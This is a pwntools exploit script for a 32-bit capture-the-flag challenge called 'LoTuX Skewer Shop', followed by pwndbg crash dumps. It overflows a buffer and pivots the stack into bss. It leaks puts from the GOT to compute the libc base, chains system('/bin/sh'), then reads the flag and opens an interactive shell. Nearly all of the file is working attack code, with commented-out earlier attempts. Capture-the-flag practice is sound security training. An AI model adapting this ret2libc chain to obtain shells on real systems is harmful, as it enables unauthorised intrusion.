#!/usr/bin/env python3
from pwn import *
import sys

context.log_level = "debug"
if len(sys.argv) == 1:
    r = process("./chal")
    if args.GDB:
        # gdb.attach(r,'b *0x8049196\nb *0x8049060\nb *0x80491f2\nb *0x80491e5')
        gdb.attach(
            r, "b *0x80491ed\nb *0x80491f2\nb *0xf7d029c6\n"
        )  # Breakpoint before read and after read.
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(-1)
elf = ELF("./chal")
bss = elf.bss()
log.info("bss: " + str(hex(bss)))  # 0x804c024
# bss4 = bss + 0x400
# bss6 = bss + 0x600  # 0x804c624
"""
Original bss stack too small so when we shell out, the stack will be too high and try to write a place without w permission.
"""
bss4 = 0x804D000 - 0x100
bss6 = 0x804D000 - 0x80
puts_plt = 0x8049060
main_addr = 0x8049196
puts_got = 0x804C014
read_in_main = 0x80491EB
read_plt = 0x8049050
leave_ret = 0x08049105
pop_ebx_ret = 0x08049022
bin_sh = 0x001B90F5
system_offset = 0x00047CB0
puts_offset = 0x00072830
# padding = cyclic(24)
# # Leaking Libc Base
# payload = padding
# payload += p32(read_in_main)
# payload += p32(main_addr)
# print(len(payload))
# padding(20) + ebp + esp
payload = b"a" * 20 + p32(bss4) + p32(read_in_main) + p32(bss4)
# x/32wx 0x804c024+0x600-20
r.sendafter("Welcome To LoTuX Skewer Shop!\n", payload)
# pause()
"""
payload = padding
payload += p32(puts_plt)
payload += p32(main_addr)
payload += p32(puts_got)
"""
# payload = b'a' * 20 + p32(bss4) + p32(read_in_main) + p32(0xDEADBEEF) # Read to 0x804c610 - 0x14(20)
# payload = b'a' * 20 + p32(bss6+0x20) + p32(read_in_main) + p32(0xDEADBEEF) # Read to 0x804c610 - 0x14(20)
# # r.sendline(payload)
# # payload=p32(bss+0x30)+p32(puts_plt)+p32(main_addr)+p32(puts_got)
# r.send(payload)
# payload=p32(puts_plt)+p32(bss6)+p32(puts_got)+p32(0xDEADBEEF)+p32(0xDEADBEEF)+p32(bss6)+p32(read_in_main)+p32(0xDEADBEEF)
# payload = p32(bss4) +p32(puts_plt)+p32(pop_ebx_ret)+p32(puts_got)+p32(read_in_main)+p32(0xDEADBEEF)+p32(0xDEADBEEF)+p32(0xDEADBEEF)
# r.send(payload)
# payload = cyclic(20) + p32(bss6) + p32(read_in_main) +p32(0xDEADBEEF)
# r.send(payload)
# payload = p32(puts_plt)+p32(main_addr)+p32(puts_got)+p32(0xDEADBEEF) +p32(0xDEADBEEF)  + p32(bss4) + p32(read_in_main) +p32(0xDEADBEEF)
# r.send(payload)
r.send(
    p32(bss6)
    + p32(puts_plt)
    + p32(pop_ebx_ret)
    + p32(puts_got)
    + p32(read_plt)
    + p32(leave_ret)
    + p32(0)
    + p32(bss6)
    + p32(0x100)
)

leakedAddr = u32(r.recv(4))
r.recv(4)
log.success("Leaked puts at: " + hex(leakedAddr))
libc = leakedAddr - 0x00072830
log.success("Libc at: " + hex(libc))
r.send(
    p32(0xDEADBEEF) # Anything you like is ok
    + p32(system_offset + libc)
    + p32(leave_ret)
    + p32(bin_sh + libc)
)
"""
0x16ef01 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x000c88b7 : pop eax ; pop edi ; pop esi ; ret

"""
# ooo = 0x000c88b7
# libc_offset = 0x21560
# og = 0x16ef01
# r.send(p32(bss4)+p32(ooo+libc)+p32(0)+p32(0xDEADBEEF)+p32(0x226000+libc)+p32(og+libc))
r.recvuntil(b'\n')
r.sendline(b'cat /home/`whoami`/flag')
log.success('Shell out.')
r.interactive()
"""
Program received signal SIGSEGV, Segmentation fault.
0xf7d029c6 in ?? () from ./libc.so.6
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────
 EAX  0xf7e26000 ◂— 0x225dac
 EBX  0x0
 ECX  0xf7cdd140 (execve) ◂— endbr32 
 EDX  0x0
 EDI  0x804c330 ◂— 0x0
 ESI  0x804c4bc ◂— 0xc /* '\x0c' */
 EBP  0xf7e26000 ◂— 0x225dac
 ESP  0x804bfc0 (_DYNAMIC+180) —▸ 0x804830c ◂— 0x20000
 EIP  0xf7d029c6 ◂— mov dword ptr [esp + 4], eax
─────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────────────────────
 ► 0xf7d029c6    mov    dword ptr [esp + 4], eax      <_DYNAMIC+184>
   0xf7d029ca    mov    eax, dword ptr [esp + 0x2a0]
   0xf7d029d1    mov    edi, dword ptr [esp + 0x2a4]
   0xf7d029d8    mov    esi, dword ptr [esp + 0x2ac]
   0xf7d029df    mov    dword ptr [esp + 0x1c], eax
   0xf7d029e3    mov    eax, dword ptr [esp + 0x2a8]
   0xf7d029ea    mov    ebp, dword ptr [esp + 0x2b0]
   0xf7d029f1    mov    dword ptr [esp + 0x10], eax
   0xf7d029f5    mov    eax, dword ptr [esp + 0x2b4]
   0xf7d029fc    mov    dword ptr [esp + 0x14], eax
   0xf7d02a00    mov    eax, dword ptr [esp + 0x2bc]
──────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ esp 0x804bfc0 (_DYNAMIC+180) —▸ 0x804830c ◂— 0x20000
01:0004│     0x804bfc4 (_DYNAMIC+184) ◂— 0x0
... ↓        6 skipped
────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► f 0 0xf7d029c6
   f 1 0xf7d03366
   f 2 0xf7d02976 posix_spawn+38
   f 3 0xf7c47983
   f 4 0x8049105 deregister_tm_clones+37
   f 5 0x804c634
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
     Start        End Perm     Size Offset File
 0x8047000  0x8048000 rw-p     1000      0 /home/kali/CTF/LoTux_CTF/Skewer Shop/Skewer_Shop/share/patch/chal
 0x8048000  0x8049000 r--p     1000   1000 /home/kali/CTF/LoTux_CTF/Skewer Shop/Skewer_Shop/share/patch/chal
 0x8049000  0x804a000 r-xp     1000   2000 /home/kali/CTF/LoTux_CTF/Skewer Shop/Skewer_Shop/share/patch/chal
 0x804a000  0x804b000 r--p     1000   3000 /home/kali/CTF/LoTux_CTF/Skewer Shop/Skewer_Shop/share/patch/chal
 0x804b000  0x804c000 r--p     1000   3000 /home/kali/CTF/LoTux_CTF/Skewer Shop/Skewer_Shop/share/patch/chal
 0x804c000  0x804d000 rw-p     1000   4000 /home/kali/CTF/LoTux_CTF/Skewer Shop/Skewer_Shop/share/patch/chal
0xf7c00000 0xf7c20000 r--p    20000      0 /home/kali/CTF/LoTux_CTF/Skewer Shop/Skewer_Shop/share/patch/libc.so.6
0xf7c20000 0xf7d9e000 r-xp   17e000  20000 /home/kali/CTF/LoTux_CTF/Skewer Shop/Skewer_Shop/share/patch/libc.so.6
0xf7d9e000 0xf7e23000 r--p    85000 19e000 /home/kali/CTF/LoTux_CTF/Skewer Shop/Skewer_Shop/share/patch/libc.so.6
0xf7e23000 0xf7e24000 ---p     1000 223000 /home/kali/CTF/LoTux_CTF/Skewer Shop/Skewer_Shop/share/patch/libc.so.6
0xf7e24000 0xf7e26000 r--p     2000 223000 /home/kali/CTF/LoTux_CTF/Skewer Shop/Skewer_Shop/share/patch/libc.so.6
0xf7e26000 0xf7e27000 rw-p     1000 225000 /home/kali/CTF/LoTux_CTF/Skewer Shop/Skewer_Shop/share/patch/libc.so.6
0xf7e27000 0xf7e31000 rw-p     a000      0 [anon_f7e27]
0xf7f71000 0xf7f73000 rw-p     2000      0 [anon_f7f71]
0xf7f73000 0xf7f77000 r--p     4000      0 [vvar]
0xf7f77000 0xf7f79000 r-xp     2000      0 [vdso]
0xf7f79000 0xf7f7a000 r--p     1000      0 /usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7f7a000 0xf7f9d000 r-xp    23000   1000 /usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7f9d000 0xf7fab000 r--p     e000  24000 /usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7fab000 0xf7fad000 r--p     2000  31000 /usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7fad000 0xf7fae000 rw-p     1000  33000 /usr/lib/i386-linux-gnu/ld-linux.so.2
0xff8cf000 0xff8f0000 rw-p    21000      0 [stack]
pwndbg> 

"""

"""
Breakpoint 3, 0xf7d029c6 in ?? () from ./libc.so.6
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────
*EAX  0xf7e26000 ◂— 0x225dac
*EBX  0x0
*ECX  0xf7cdd140 (execve) ◂— endbr32 
*EDX  0x0
*EDI  0x804cc8c ◂— 0x0
*ESI  0x804ce18 ◂— 0xc /* '\x0c' */
*EBP  0xf7e26000 ◂— 0x225dac
*ESP  0x804c91c ◂— 0x0
*EIP  0xf7d029c6 ◂— mov dword ptr [esp + 4], eax
─────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────────────────────
 ► 0xf7d029c6    mov    dword ptr [esp + 4], eax
   0xf7d029ca    mov    eax, dword ptr [esp + 0x2a0]
   0xf7d029d1    mov    edi, dword ptr [esp + 0x2a4]
   0xf7d029d8    mov    esi, dword ptr [esp + 0x2ac]
   0xf7d029df    mov    dword ptr [esp + 0x1c], eax
   0xf7d029e3    mov    eax, dword ptr [esp + 0x2a8]
   0xf7d029ea    mov    ebp, dword ptr [esp + 0x2b0]
   0xf7d029f1    mov    dword ptr [esp + 0x10], eax
   0xf7d029f5    mov    eax, dword ptr [esp + 0x2b4]
   0xf7d029fc    mov    dword ptr [esp + 0x14], eax
   0xf7d02a00    mov    eax, dword ptr [esp + 0x2bc]
──────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ esp 0x804c91c ◂— 0x0
... ↓        7 skipped
────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► f 0 0xf7d029c6
   f 1 0xf7d03366
   f 2 0xf7d02976 posix_spawn+38
   f 3 0xf7c47983
   f 4 0x8049105 deregister_tm_clones+37
   f 5 0x804cf90
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
"""
